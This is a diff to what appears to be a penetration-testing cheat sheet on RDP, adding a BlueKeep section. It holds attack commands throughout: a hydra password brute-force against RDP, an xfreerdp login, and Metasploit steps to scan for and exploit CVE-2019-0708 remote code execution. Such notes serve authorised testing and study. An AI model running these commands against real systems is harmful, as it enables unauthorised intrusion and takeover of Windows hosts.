@@ -17,3 +17,12 @@ hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/
 ```
 xfreerdp /u:administrator /p:<password> /v:<ip>:<port>
 ```
+
+## BlueKeep
+```
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+show targets
+set target <id>
+```
